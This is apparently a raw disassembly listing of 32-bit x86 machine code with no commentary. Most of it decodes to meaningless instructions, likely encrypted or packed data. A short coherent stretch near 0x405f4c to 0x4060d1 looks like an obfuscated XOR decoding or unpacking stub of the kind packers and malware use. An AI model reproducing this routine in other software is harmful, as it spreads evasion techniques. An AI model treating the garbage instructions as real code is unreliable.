  405976:	mov    ds:0x1660f2ae,eax
  40597b:	sbb    al,0x4f
  40597d:	inc    esi
  40597e:	and    BYTE PTR [ecx-0x14502bd2],ah
  405984:	idiv   BYTE PTR [esi]
  405986:	ss je  0x4059b4
  405989:	xchg   ebp,eax
  40598a:	sbb    eax,0x37066030
  40598f:	rcr    DWORD PTR [ecx],0x38
  405992:	je     0x40596f
  405994:	jmp    0x4a8a:0xf5217fec
  40599b:	xchg   ecx,eax
  40599c:	jbe    0x4059d8
  40599e:	xor    DWORD PTR [esp+edi*1],edi
  4059a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059a2:	fs shl eax,cl
  4059a5:	or     eax,0x2f45303
  4059aa:	popf   
  4059ab:	lods   al,BYTE PTR ds:[esi]
  4059ac:	pop    esi
  4059ad:	std    
  4059ae:	push   eax
  4059af:	icebp  
  4059b0:	mov    bl,0x5e
  4059b2:	xor    al,BYTE PTR [edx-0x27]
  4059b5:	jge    0x4059bc
  4059b7:	mov    eax,DWORD PTR [eax]
  4059b9:	jne    0x405a37
  4059bb:	jnp    0x405959
  4059bd:	jg     0x4059d8
  4059bf:	and    al,0xa1
  4059c1:	jns    0x4059c6
  4059c3:	mov    ds:0x3457a785,al
  4059c8:	pop    ecx
  4059c9:	aam    0x32
  4059cb:	in     al,dx
  4059cc:	cs dec edx
  4059ce:	xchg   DWORD PTR [ecx-0x26],eax
  4059d1:	aam    0xea
  4059d3:	sbb    eax,0xa3823dbb
  4059d8:	test   eax,0x2f167577
  4059dd:	shl    BYTE PTR [ecx+0x4e],cl
  4059e0:	sub    ebp,DWORD PTR [edi-0x7]
  4059e3:	push   ebp
  4059e4:	in     eax,dx
  4059e5:	adc    ecx,DWORD PTR [ebx+eiz*2]
  4059e8:	outs   dx,BYTE PTR ds:[esi]
  4059e9:	inc    edi
  4059ea:	ins    BYTE PTR es:[edi],dx
  4059eb:	outs   dx,BYTE PTR ds:[esi]
  4059ec:	(bad)  
  4059ed:	add    DWORD PTR [edi],edi
  4059ef:	imul   ebx,DWORD PTR [edi-0x26aeb714],0x12d54191
  4059f9:	sub    DWORD PTR [edi-0x13],esi
  4059fc:	push   ebp
  4059fd:	vpsubw xmm5,xmm7,XMMWORD PTR [eax-0xc97a8b3]
  405a05:	jmp    0xf77a98c6
  405a0a:	xchg   esi,eax
  405a0b:	das    
  405a0c:	scas   al,BYTE PTR es:[edi]
  405a0d:	shl    DWORD PTR [ebp-0x21],0xa
  405a11:	cdq    
  405a12:	sub    BYTE PTR [edi],dl
  405a14:	pop    ebx
  405a15:	sub    BYTE PTR [eax+0x55feaa4a],0x94
  405a1c:	inc    ebp
  405a1d:	clc    
  405a1e:	shl    DWORD PTR [edi+0x3bd53e6],0x70
  405a25:	pop    ebp
  405a26:	fadd   st(2),st
  405a28:	bound  esi,QWORD PTR [esi+ebx*8+0x6c92fd00]
  405a2f:	arpl   WORD PTR [esi+esi*2-0x59b75f8f],ax
  405a36:	dec    edx
  405a37:	stos   BYTE PTR es:[edi],al
  405a38:	mov    dl,0x69
  405a3a:	(bad)  
  405a3b:	nop
  405a3c:	and    ch,BYTE PTR [esi-0x4cddd0]
  405a42:	xchg   ecx,eax
  405a43:	jbe    0x405a0c
  405a45:	mov    BYTE PTR [edi-0x750131a3],cl
  405a4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a4c:	ret    0x3373
  405a4f:	ds push cs
  405a51:	and    BYTE PTR [ecx],dh
  405a53:	sub    dl,BYTE PTR [ebp+0x66]
  405a56:	repz ja 0x4059d9
  405a59:	xchg   ecx,eax
  405a5a:	ins    DWORD PTR es:[edi],dx
  405a5b:	pop    edi
  405a5c:	pop    eax
  405a5d:	js     0x405a9f
  405a5f:	mov    esp,0x7092e0d3
  405a64:	fimul  DWORD PTR [ecx-0x47]
  405a67:	mov    eax,0x62775b5c
  405a6c:	rcl    BYTE PTR [edx],1
  405a6e:	out    dx,al
  405a6f:	jle    0x405ac5
  405a71:	mov    bh,0x57
  405a73:	std    
  405a74:	scas   al,BYTE PTR es:[edi]
  405a75:	aam    0x7c
  405a77:	imul   edi,DWORD PTR [esi],0x22ee459a
  405a7d:	ins    BYTE PTR es:[edi],dx
  405a7e:	retf   0xa094
  405a81:	and    eax,DWORD PTR [ebp+0x406f65db]
  405a87:	sbb    DWORD PTR [edi+0x4d408cf8],esi
  405a8d:	cli    
  405a8e:	xchg   ecx,eax
  405a8f:	sub    cl,BYTE PTR [eax]
  405a91:	sub    ebp,DWORD PTR [ebx-0x7ff0792b]
  405a97:	imul   eax,DWORD PTR [eax-0x7c07387e],0xc918a525
  405aa1:	cmp    BYTE PTR [edi],ch
  405aa3:	in     al,0x1d
  405aa5:	xor    al,0x92
  405aa7:	shl    BYTE PTR [esi-0x51ae706c],cl
  405aad:	mov    edi,0xbac45f6e
  405ab2:	out    dx,eax
  405ab3:	in     eax,0x27
  405ab5:	pusha  
  405ab6:	jbe    0x405a75
  405ab8:	fadd   QWORD PTR [edx-0x80]
  405abb:	fwait
  405abc:	scas   eax,DWORD PTR es:[edi]
  405abd:	ja     0x405a60
  405abf:	jmp    0x405ada
  405ac1:	fstp   TBYTE PTR fs:[eax]
  405ac4:	cdq    
  405ac5:	mov    ah,0xad
  405ac7:	xor    eax,0xf1e67914
  405acc:	out    dx,ax
  405ace:	adc    al,0x5d
  405ad0:	scas   al,BYTE PTR es:[edi]
  405ad1:	lahf   
  405ad2:	cmp    ah,BYTE PTR [esi-0x14]
  405ad5:	mov    dh,0x77
  405ad7:	popa   
  405ad8:	aas    
  405ad9:	rol    BYTE PTR [ecx+0x29],1
  405adc:	imul   edx,DWORD PTR [ebp-0x38],0xfffffff5
  405ae0:	repz xchg esp,eax
  405ae2:	xchg   ecx,eax
  405ae3:	sbb    BYTE PTR [edx-0x46a0649c],0xa6
  405aea:	outs   dx,BYTE PTR ds:[esi]
  405aeb:	xchg   DWORD PTR [esi+esi*2-0x3e64a1cc],ebx
  405af2:	push   edx
  405af3:	(bad)
  405af7:	jp     0x405ab5
  405af9:	dec    ebp
  405afa:	enter  0x9c9c,0x88
  405afe:	frstor [edx+edx*8+0x37b0e51]
  405b05:	das    
  405b06:	pop    ebx
  405b07:	int    0x96
  405b09:	jl     0x405b6a
  405b0b:	retf   
  405b0c:	and    BYTE PTR [eax],cl
  405b0e:	popf   
  405b0f:	mov    ebx,0x6c6b1995
  405b14:	cmp    al,0x7d
  405b16:	lds    esp,FWORD PTR ds:0x91156501
  405b1c:	mov    bl,0x5c
  405b1e:	ror    BYTE PTR [ecx+eax*1],1
  405b21:	(bad)  
  405b22:	adc    cl,ch
  405b24:	push   ebx
  405b25:	cmp    ebx,edx
  405b27:	and    esp,ecx
  405b29:	push   cs
  405b2a:	in     al,0x63
  405b2c:	ss cli 
  405b2e:	pop    ds
  405b2f:	lods   al,BYTE PTR ds:[esi]
  405b30:	pop    DWORD PTR [edi-0x1e]
  405b33:	mov    bl,0x26
  405b35:	push   es
  405b36:	mov    edx,0xd7e62981
  405b3b:	inc    ebp
  405b3c:	push   ecx
  405b3d:	in     al,0x1f
  405b3f:	pop    es
  405b40:	jecxz  0x405ba7
  405b42:	push   ecx
  405b43:	inc    eax
  405b44:	inc    ebx
  405b45:	cmp    BYTE PTR [ebp+0x773877b7],0x56
  405b4c:	shr    DWORD PTR [ecx],1
  405b4e:	cld    
  405b4f:	scas   al,BYTE PTR es:[edi]
  405b50:	add    DWORD PTR [esi+0x1f],ecx
  405b53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b54:	pop    eax
  405b55:	inc    ebx
  405b56:	or     ch,BYTE PTR [esi-0x6fc63684]
  405b5c:	push   ebx
  405b5d:	js     0x405b22
  405b5f:	pusha  
  405b60:	and    al,al
  405b62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b63:	iret   
  405b64:	jl     0x405b3b
  405b66:	mov    ?,WORD PTR [esi]
  405b68:	jo     0x405be2
  405b6a:	retf   
  405b6b:	int3   
  405b6c:	fcomp  DWORD PTR [esi+0x1d6f24c7]
  405b72:	inc    ebp
  405b73:	mov    esp,0xcb290ac5
  405b78:	push   0xffffffc7
  405b7a:	xchg   edx,eax
  405b7b:	fwait
  405b7c:	mov    ds:0x710029aa,al
  405b81:	enter  0x6b77,0x90
  405b85:	in     eax,0x7f
  405b87:	jne    0x405bdf
  405b89:	xchg   esi,eax
  405b8a:	aaa    
  405b8b:	daa    
  405b8c:	not    DWORD PTR [ecx-0x68]
  405b8f:	sbb    ecx,DWORD PTR [ecx]
  405b91:	mov    WORD PTR [ecx-0x625b2b18],?
  405b97:	(bad)  
  405b98:	ss jns 0x405ba9
  405b9b:	js     0x405b7d
  405b9d:	fimul  WORD PTR [edi-0x75d1901f]
  405ba3:	imul   edi,DWORD PTR [esi+0x7120c593],0x5ce4df19
  405bad:	in     eax,0xcf
  405baf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bb0:	xchg   esi,eax
  405bb1:	mov    dl,0x35
  405bb3:	xchg   DWORD PTR [si],ebp
  405bb6:	pop    ebp
  405bb7:	mov    eax,ds:0x8a3f8e7b
  405bbc:	and    al,0xd3
  405bbe:	ja     0x405c18
  405bc0:	cld    
  405bc1:	sbb    ebx,ecx
  405bc3:	ja     0x405b9c
  405bc5:	cdq    
  405bc6:	loope  0x405b7a
  405bc8:	call   0xe5e9:0x2c5a25e6
  405bcf:	dec    eax
  405bd0:	add    ah,0x26
  405bd3:	push   esi
  405bd4:	jmp    0x405b91
  405bd6:	arpl   WORD PTR [ebx+0x777edf5e],si
  405bdc:	lods   eax,DWORD PTR ds:[esi]
  405bdd:	(bad)  
  405bde:	jecxz  0x405bfb
  405be0:	sahf   
  405be1:	gs push ss
  405be3:	push   edi
  405be4:	lods   eax,DWORD PTR ds:[esi]
  405be5:	test   DWORD PTR [edx],ecx
  405be7:	call   0xa9f9ad67
  405bec:	shl    DWORD PTR [ebx+0x10],0x74
  405bf0:	loope  0x405b98
  405bf2:	push   esi
  405bf3:	mov    ds:0x41c278ab,eax
  405bf8:	nop
  405bf9:	pop    esi
  405bfa:	push   0x70
  405bfc:	imul   edi,DWORD PTR [eax+0x4f],0x40a4f954
  405c03:	push   0x582f58a9
  405c08:	pushf  
  405c09:	iret   
  405c0a:	in     al,0xee
  405c0c:	ret    
  405c0d:	out    dx,eax
  405c0e:	and    edi,DWORD PTR [edi-0x27860399]
  405c14:	cmp    ebp,DWORD PTR [esi]
  405c16:	mov    esi,0x54a45d2d
  405c1b:	add    al,0x3e
  405c1d:	test   DWORD PTR [ebp-0x250dce39],ebp
  405c23:	ss ret 0x5728
  405c27:	scas   eax,DWORD PTR es:[edi]
  405c28:	adc    al,0xf0
  405c2a:	add    BYTE PTR [edi+0x6e235c34],bl
  405c30:	jnp    0x405c4b
  405c32:	xchg   ebx,eax
  405c33:	nop
  405c34:	xor    ecx,DWORD PTR [esi]
  405c36:	(bad)
  405c39:	sti    
  405c3a:	xchg   ebx,eax
  405c3b:	jmp    0xf6be:0xe62f8efb
  405c42:	and    dl,bl
  405c44:	pop    edx
  405c45:	jmp    0xaac9bb74
  405c4a:	mov    al,ds:0xac6bbab
  405c4f:	push   ecx
  405c50:	or     dl,dh
  405c52:	shl    edi,cl
  405c54:	dec    ebx
  405c55:	int3   
  405c56:	jecxz  0x405ccd
  405c58:	xlat   BYTE PTR ds:[ebx]
  405c59:	mov    DWORD PTR [esi+edx*8+0x526d64b2],edi
  405c60:	pop    edi
  405c61:	dec    esp
  405c62:	xor    eax,0x2810a986
  405c67:	sub    DWORD PTR [edi],0xffffffbc
  405c6a:	lods   al,BYTE PTR ds:[esi]
  405c6b:	sub    BYTE PTR [ebx-0x191c0cf8],bh
  405c71:	dec    edx
  405c72:	js     0x405c24
  405c74:	jl     0x405c85
  405c76:	xor    dl,BYTE PTR [edi+ecx*1+0x70]
  405c7a:	mov    al,ds:0x92673257
  405c7f:	fnsave [ebp+0x73]
  405c82:	sbb    dh,al
  405c84:	mov    ebx,0x662a65d5
  405c89:	or     eax,0x78b3c4ed
  405c8e:	sbb    bh,ch
  405c90:	ins    BYTE PTR es:[edi],dx
  405c91:	arpl   WORD PTR cs:[esi+0x1219bf2e],sp
  405c98:	dec    ebp
  405c99:	cld    
  405c9a:	daa    
  405c9b:	mov    eax,ds:0x56f1db44
  405ca0:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  405ca2:	hlt    
  405ca3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ca4:	pop    ss
  405ca5:	(bad)  
  405ca6:	mov    bh,0xb8
  405ca8:	dec    ecx
  405ca9:	mov    al,0x88
  405cab:	adc    al,0x13
  405cad:	dec    ebx
  405cae:	xchg   esp,eax
  405caf:	jl     0x405d02
  405cb1:	dec    eax
  405cb2:	cdq    
  405cb3:	ja     0x405c4e
  405cb5:	cmp    ebp,ebx
  405cb7:	sbb    ch,BYTE PTR [edi+0x7b59da18]
  405cbd:	dec    esp
  405cbe:	sbb    esi,DWORD PTR [eax+0x6d]
  405cc1:	xchg   ecx,eax
  405cc2:	mov    esi,edx
  405cc4:	mov    esi,0x907425b
  405cc9:	mov    ebx,0xe3714ba0
  405cce:	xchg   BYTE PTR [edi+0x79a0cbd2],dh
  405cd4:	mov    edi,0xb6aa13f0
  405cd9:	dec    ebp
  405cda:	sub    al,0x34
  405cdc:	dec    edx
  405cdd:	sub    eax,0xa20a4e76
  405ce2:	cmp    eax,0xa8eb1fef
  405ce7:	xchg   ecx,eax
  405ce8:	jl     0x405c92
  405cea:	in     eax,dx
  405ceb:	popa   
  405cec:	rol    BYTE PTR [eax+0x2ec9f235],cl
  405cf2:	mov    ecx,0x8f82e7b9
  405cf7:	xor    BYTE PTR [eax-0x2],ch
  405cfa:	repz bound edx,QWORD PTR ds:0xa512b829
  405d01:	sub    cl,bh
  405d03:	not    eax
  405d05:	ins    DWORD PTR es:[edi],dx
  405d06:	add    edi,DWORD PTR [eax+0x24]
  405d09:	fndisi(8087 only) 
  405d0b:	dec    esp
  405d0c:	xchg   DWORD PTR [ecx-0x2e],esp
  405d0f:	mov    ecx,esp
  405d11:	test   al,0xf1
  405d13:	add    ebp,esp
  405d15:	adc    BYTE PTR [edx+edi*1-0x7f],cl
  405d19:	lods   eax,DWORD PTR ds:[esi]
  405d1a:	add    al,0xfb
  405d1c:	lahf   
  405d1d:	popf   
  405d1e:	jl     0x405d8f
  405d20:	pop    eax
  405d21:	jp     0x405cac
  405d23:	mov    dl,BYTE PTR [ecx-0x56]
  405d26:	jg     0x405cae
  405d28:	dec    ebx
  405d29:	mov    bh,0x6d
  405d2b:	pusha  
  405d2c:	mov    edi,0xc9716c53
  405d31:	in     eax,dx
  405d32:	ins    DWORD PTR es:[edi],dx
  405d33:	add    eax,0x392195fe
  405d38:	(bad)  
  405d3a:	push   0xffffffa8
  405d3c:	mov    edx,DWORD PTR [edi+ebp*1-0x20]
  405d40:	adc    al,0xe5
  405d42:	loope  0x405daa
  405d44:	into   
  405d45:	jle    0x405cf9
  405d47:	call   0x6169:0x31af2e8e
  405d4e:	leave  
  405d4f:	mov    edi,0x84f485d
  405d54:	(bad)  
  405d55:	sti    
  405d56:	loop   0x405d8b
  405d58:	out    dx,eax
  405d59:	and    dh,al
  405d5b:	mov    al,ds:0x6ccb426e
  405d60:	add    al,0x6d
  405d62:	inc    edx
  405d63:	fsub   QWORD PTR [edi+0xe9146a8]
  405d69:	mov    esi,0x830008c2
  405d6e:	clc    
  405d6f:	pop    edi
  405d70:	icebp  
  405d71:	int3   
  405d72:	rcl    ecx,1
  405d74:	jl     0x405de2
  405d76:	cmovb  ecx,DWORD PTR [eax]
  405d79:	daa    
  405d7a:	lods   al,BYTE PTR ds:[esi]
  405d7b:	xchg   esp,eax
  405d7c:	std    
  405d7d:	retf   
  405d7e:	pop    edx
  405d7f:	xchg   esp,eax
  405d80:	aaa    
  405d81:	mov    al,0x71
  405d83:	mov    ah,ch
  405d85:	call   0x4e3b:0x35493c84
  405d8c:	mov    ebp,DWORD PTR [esi-0x14]
  405d8f:	dec    eax
  405d90:	sub    al,0x51
  405d92:	iret   
  405d93:	sbb    BYTE PTR [ebp+0x5c],0xb7
  405d97:	jl     0x405dc1
  405d99:	pop    esi
  405d9a:	mov    WORD PTR [edx],ds
  405d9c:	xor    esp,DWORD PTR [eax]
  405d9e:	test   DWORD PTR [edx+ecx*2+0x18],ebp
  405da2:	or     al,0x14
  405da4:	call   0xcf71:0x64942b93
  405dab:	mov    ebx,0x4a96b4d0
  405db0:	in     al,0x3
  405db2:	arpl   WORD PTR ds:0xfb53613c,bx
  405db8:	mov    cl,0x2b
  405dba:	bnd jmp 0xa28ca49b
  405dc0:	mov    al,0x6b
  405dc2:	sub    dh,BYTE PTR [edx-0x4e2b7d90]
  405dc8:	or     BYTE PTR [edi-0x52],bl
  405dcb:	sbb    BYTE PTR [esi+0x29],0x76
  405dcf:	xor    eax,DWORD PTR [eax+0x32d1ab86]
  405dd5:	sbb    eax,0xd317fa7a
  405dda:	push   DWORD PTR [ebx+eiz*2-0x67]
  405dde:	(bad)  
  405ddf:	in     eax,dx
  405de0:	repz sub BYTE PTR [esi-0xbf5118],cl
  405de7:	les    edx,FWORD PTR [edx-0x43b982fc]
  405ded:	es stc 
  405def:	aas    
  405df0:	lea    ebx,[edi]
  405df2:	push   ebx
  405df3:	scas   al,BYTE PTR es:[edi]
  405df4:	scas   eax,DWORD PTR es:[edi]
  405df5:	and    DWORD PTR [ecx-0x2acc6e94],0x73
  405dfc:	iret   
  405dfd:	mov    ds:0x4ff5e6f,eax
  405e02:	aad    0x1c
  405e04:	jb     0x405d90
  405e06:	nop
  405e07:	sbb    dl,bh
  405e09:	mov    cl,0x8c
  405e0b:	dec    esi
  405e0c:	out    dx,eax
  405e0d:	add    dl,dl
  405e0f:	and    BYTE PTR [edx],cl
  405e11:	inc    esp
  405e12:	repz shl BYTE PTR [ebp+0x6d],1
  405e16:	add    ch,BYTE PTR [ecx-0x29]
  405e19:	pushf  
  405e1a:	adc    esi,DWORD PTR [ebx]
  405e1c:	cmp    al,0xf2
  405e1e:	xor    BYTE PTR [edx+0x2b],cl
  405e21:	stos   BYTE PTR es:[edi],al
  405e22:	ins    DWORD PTR es:[edi],dx
  405e23:	xchg   esp,eax
  405e24:	sub    al,0xe2
  405e26:	push   edx
  405e27:	ja     0x405e67
  405e29:	xor    DWORD PTR [esi+0x34],esp
  405e2c:	jecxz  0x405e7b
  405e2e:	add    DWORD PTR ds:0xf20cf3a3,eax
  405e34:	mov    eax,ds:0x5a9b868b
  405e39:	in     eax,dx
  405e3a:	inc    ebp
  405e3b:	push   es
  405e3c:	mov    BYTE PTR [ebp+0x4acbb253],ah
  405e42:	jo     0x405e64
  405e44:	jno    0x405e6c
  405e46:	ds or  al,0xc4
  405e49:	lahf   
  405e4a:	add    al,BYTE PTR [eax+0x29]
  405e4d:	add    al,0xaa
  405e50:	inc    edi
  405e51:	dec    ecx
  405e52:	or     ecx,edx
  405e54:	dec    ecx
  405e55:	pop    edx
  405e56:	add    BYTE PTR [edi],0x6c
  405e59:	scas   eax,DWORD PTR es:[edi]
  405e5a:	dec    edi
  405e5b:	mov    esp,0x58cbd6d5
  405e60:	dec    esp
  405e61:	xchg   edi,eax
  405e62:	nop
  405e63:	lods   al,BYTE PTR ds:[esi]
  405e64:	stc    
  405e65:	xor    eax,0xbe34ac3e
  405e6a:	dec    esp
  405e6b:	stos   BYTE PTR es:[edi],al
  405e6c:	test   DWORD PTR [eax-0x7c08545e],0x2b369d8f
  405e76:	pop    esi
  405e77:	sbb    eax,0x32
  405e7a:	popa   
  405e7b:	lods   eax,DWORD PTR ds:[esi]
  405e7c:	inc    edx
  405e7d:	retf   0xa931
  405e80:	ret    
  405e81:	mov    fs,WORD PTR [ebp+0x55]
  405e84:	inc    edx
  405e85:	jmp    0xc3b5f7b3
  405e8a:	shl    BYTE PTR [bx+di-0x46],0xf2
  405e8f:	mov    bh,0x14
  405e91:	fstp   st(3)
  405e93:	icebp  
  405e94:	(bad)  
  405e95:	jmp    0xcf4d3469
  405e9a:	jno    0x405ebd
  405e9c:	ss jns 0x405e2d
  405e9f:	adc    BYTE PTR [esi+0x79],bh
  405ea2:	sub    al,0x73
  405ea4:	pusha  
  405ea5:	test   DWORD PTR [ebx],ebx
  405ea7:	sub    al,0x9f
  405eaa:	mov    WORD PTR [edx+0x5c9d188],?
  405eb0:	fwait
  405eb1:	jmp    0x31fd:0x2b58e9dc
  405eb8:	sub    al,0x45
  405eba:	icebp  
  405ebb:	scas   eax,DWORD PTR es:[edi]
  405ebc:	push   ebp
  405ebd:	mov    ah,0x74
  405ebf:	mov    ebx,0x22421de1
  405ec4:	enter  0xd50c,0x8
  405ec8:	xor    ch,0x77
  405ecb:	enter  0xee08,0x9c
  405ecf:	lods   al,BYTE PTR ds:[esi]
  405ed0:	add    ecx,DWORD PTR [ecx-0xc]
  405ed3:	cmc    
  405ed4:	jns    0x405e74
  405ed6:	add    BYTE PTR [esi-0x75],0xf0
  405eda:	stos   BYTE PTR es:[edi],al
  405edb:	hlt    
  405edc:	mov    ebx,0xe0e0ddb9
  405ee1:	xchg   esp,eax
  405ee2:	inc    esp
  405ee3:	mov    bl,BYTE PTR [esi+0x6d]
  405ee6:	cmp    dh,BYTE PTR [ebx+eiz*4+0x5026201]
  405eed:	dec    eax
  405eee:	push   ecx
  405eef:	ss sub dl,ch
  405ef2:	(bad)  
  405ef3:	pop    esi
  405ef4:	test   DWORD PTR [esp+ebx*4-0x30],esp
  405ef8:	jnp    0x405ed7
  405efa:	push   0xd
  405efc:	fs pop edx
  405efe:	in     eax,dx
  405eff:	pop    ds
  405f00:	clc    
  405f01:	data16 daa 
  405f03:	outs   dx,DWORD PTR ds:[esi]
  405f04:	mov    esp,0xfb6b5a36
  405f09:	lea    ebp,[edx+eax*8+0x36]
  405f0d:	pop    ss
  405f0e:	pop    es
  405f0f:	push   ebx
  405f10:	cmp    BYTE PTR [edi],ah
  405f12:	push   ss
  405f13:	push   esi
  405f14:	fwait
  405f15:	adc    eax,0x8fc9f1e5
  405f1a:	aaa    
  405f1b:	cli    
  405f1c:	pop    ss
  405f1d:	pop    edi
  405f1e:	mov    BYTE PTR [edx],cl
  405f20:	iret   
  405f21:	mov    ecx,DWORD PTR [edx]
  405f23:	mov    esp,0xa29f35c0
  405f28:	dec    ecx
  405f29:	or     DWORD PTR [eax],esp
  405f2b:	push   eax
  405f2c:	gs dec edx
  405f2e:	test   BYTE PTR [ebx-0x29184ef2],al
  405f34:	int3   
  405f35:	pusha  
  405f36:	inc    esi
  405f37:	push   es
  405f38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f39:	lea    ecx,[edi-0x65839654]
  405f3f:	test   eax,0xd822eb5c
  405f44:	add    DWORD PTR [esi],ecx
  405f46:	or     DWORD PTR [ecx+0x458bd445],ecx
  405f4c:	test   al,0x2b
  405f4e:	ror    DWORD PTR [ecx+0x458be445],0xe4
  405f55:	mov    DWORD PTR [ebp-0x14],eax
  405f58:	mov    eax,DWORD PTR [ebp-0x2c]
  405f5b:	mov    DWORD PTR [ebp-0x38],0xf89c85b5
  405f62:	mov    DWORD PTR [ebp-0x54],eax
  405f65:	mov    DWORD PTR [ebp-0x20],0xf89c85b4
  405f6c:	mov    eax,DWORD PTR [ebp-0x38]
  405f6f:	xor    eax,esi
  405f71:	add    eax,edi
  405f73:	mov    DWORD PTR [ebp-0x10],eax
  405f76:	mov    eax,DWORD PTR [ebp-0x38]
  405f79:	xor    eax,esi
  405f7b:	add    eax,edi
  405f7d:	mov    DWORD PTR [ebp-0x8],eax
  405f80:	mov    DWORD PTR [ebp-0x2c],0xf89c8595
  405f87:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  405f8e:	mov    eax,DWORD PTR [ebp-0x38]
  405f91:	mov    edx,DWORD PTR [ebp-0x14]
  405f94:	xor    eax,esi
  405f96:	add    eax,edi
  405f98:	cmp    edx,eax
  405f9a:	je     0x40852b
  405fa0:	mov    eax,DWORD PTR [ebp-0x20]
  405fa3:	xor    eax,esi
  405fa5:	mov    edx,0xffcd8d06
  405faa:	sub    edx,eax
  405fac:	add    edx,DWORD PTR [ebp-0x14]
  405faf:	mov    eax,DWORD PTR [ebp-0x20]
  405fb2:	mov    ebx,DWORD PTR [ebp-0x10]
  405fb5:	xor    eax,esi
  405fb7:	add    eax,edi
  405fb9:	imul   eax,ebx
  405fbc:	cmp    eax,edx
  405fbe:	ja     0x408528
  405fc4:	mov    edx,DWORD PTR [ebp-0x10]
  405fc7:	mov    eax,DWORD PTR [ebp-0x14]
  405fca:	mov    ebx,DWORD PTR [ebp-0x2c]
  405fcd:	sub    eax,edx
  405fcf:	xor    ebx,esi
  405fd1:	xor    edx,edx
  405fd3:	add    ebx,edi
  405fd5:	div    ebx
  405fd7:	mov    DWORD PTR [ebp-0x8],eax
  405fda:	mov    eax,DWORD PTR [ebp-0x44]
  405fdd:	mov    edx,DWORD PTR [ebp-0x8]
  405fe0:	xor    eax,esi
  405fe2:	add    eax,edi
  405fe4:	cmp    edx,eax
  405fe6:	jbe    0x405ff6
  405fec:	mov    eax,DWORD PTR [ebp-0x44]
  405fef:	xor    eax,esi
  405ff1:	add    eax,edi
  405ff3:	mov    DWORD PTR [ebp-0x8],eax
  405ff6:	mov    eax,DWORD PTR [ebp-0x2c]
  405ff9:	mov    edx,DWORD PTR [ebp-0x8]
  405ffc:	xor    eax,esi
  405ffe:	add    eax,edi
  406000:	imul   eax,edx
  406003:	mov    DWORD PTR [ebp-0x8],eax
  406006:	mov    eax,DWORD PTR [ebp-0x38]
  406009:	mov    edx,DWORD PTR [ebp-0x8]
  40600c:	xor    eax,esi
  40600e:	add    eax,edi
  406010:	cmp    edx,eax
  406012:	je     0x408511
  406018:	mov    eax,DWORD PTR [ebp-0x8]
  40601b:	mov    DWORD PTR [ebp-0x18],eax
  40601e:	mov    eax,DWORD PTR [ebp-0x10]
  406021:	add    eax,DWORD PTR [ebp-0x54]
  406024:	mov    DWORD PTR [ebp-0x1c],0xf89c85b5
  40602b:	mov    DWORD PTR [ebp-0x8],eax
  40602e:	mov    eax,0xf89c85b4
  406033:	mov    DWORD PTR [ebp-0x28],eax
  406036:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  40603d:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  406044:	mov    DWORD PTR [ebp-0x30],eax
  406047:	mov    eax,DWORD PTR [ebp-0x1c]
  40604a:	xor    eax,esi
  40604c:	add    eax,edi
  40604e:	jmp    0x4084cd
  406053:	mov    DWORD PTR [ebp-0x4c],0xf89c85a2
  40605a:	mov    DWORD PTR [ebp-0x50],0xf89c85af
  406061:	mov    eax,DWORD PTR [ebp-0x30]
  406064:	mov    edx,DWORD PTR [ebp-0xc]
  406067:	xor    eax,esi
  406069:	add    eax,edi
  40606b:	imul   eax,edx
  40606e:	mov    edx,DWORD PTR [ebp-0x8]
  406071:	mov    al,BYTE PTR [eax+edx*1]
  406074:	mov    BYTE PTR [ebp-0x1],al
  406077:	mov    eax,DWORD PTR [ebp-0x30]
  40607a:	mov    edx,DWORD PTR [ebp-0xc]
  40607d:	xor    eax,esi
  40607f:	add    eax,edi
  406081:	imul   eax,edx
  406084:	mov    edx,DWORD PTR [ebp-0x5c]
  406087:	xor    edx,esi
  406089:	add    eax,edx
  40608b:	mov    edx,DWORD PTR [ebp-0x8]
  40608e:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  406096:	mov    edx,DWORD PTR [ebp-0x4c]
  406099:	xor    edx,esi
  40609b:	lea    eax,[edx+eax*1+0x3272fa]
  4060a2:	movzx  edx,BYTE PTR [ebp-0x1]
  4060a6:	xor    edx,eax
  4060a8:	mov    BYTE PTR [ebp-0x1],dl
  4060ab:	mov    al,BYTE PTR [ebp-0x1]
  4060ae:	mov    edx,DWORD PTR [ebp-0x30]
  4060b1:	mov    ebx,DWORD PTR [ebp-0xc]
  4060b4:	xor    edx,esi
  4060b6:	add    edx,edi
  4060b8:	imul   edx,ebx
  4060bb:	mov    ebx,DWORD PTR [ebp-0x8]
  4060be:	mov    BYTE PTR [edx+ebx*1],al
  4060c1:	mov    eax,DWORD PTR [ebp-0x30]
  4060c4:	mov    edx,DWORD PTR [ebp-0xc]
  4060c7:	xor    eax,esi
  4060c9:	add    eax,edi
  4060cb:	imul   eax,edx
  4060ce:	mov    edx,DWORD PTR [ebp-0x8]
  4060d1:	jmp    0x408469
  4060d6:	leave  
  4060d7:	pop    es
  4060d8:	xchg   DWORD PTR ds:0x47490549,eax
  4060de:	(bad)  
  4060df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060e0:	or     bl,cl
  4060e2:	(bad)  
  4060e3:	xchg   ah,bl
  4060e5:	imul   esi,DWORD PTR [ecx-0x3f],0x7b
  4060e9:	jnp    0x4060df
  4060eb:	pushf  
  4060ec:	jnp    0x406169
  4060ee:	in     eax,dx
  4060ef:	sar    esi,0x51
  4060f2:	mov    DWORD PTR ds:0xe273a543,ecx
  4060f8:	pop    ecx
  4060f9:	xchg   ebp,eax
  4060fa:	stc    
  4060fb:	adc    dl,BYTE PTR [esi+0x44]
  4060fe:	mov    WORD PTR [edi-0x28],ds
  406101:	ds mov bh,0x0
  406104:	xor    eax,0xe2d0410
  406109:	stos   BYTE PTR es:[edi],al
  40610a:	jno    0x406171
  40610c:	and    esp,DWORD PTR [ecx-0x4684c4de]
  406112:	out    dx,eax
  406113:	ins    BYTE PTR es:[edi],dx
  406114:	lods   eax,DWORD PTR ds:[esi]
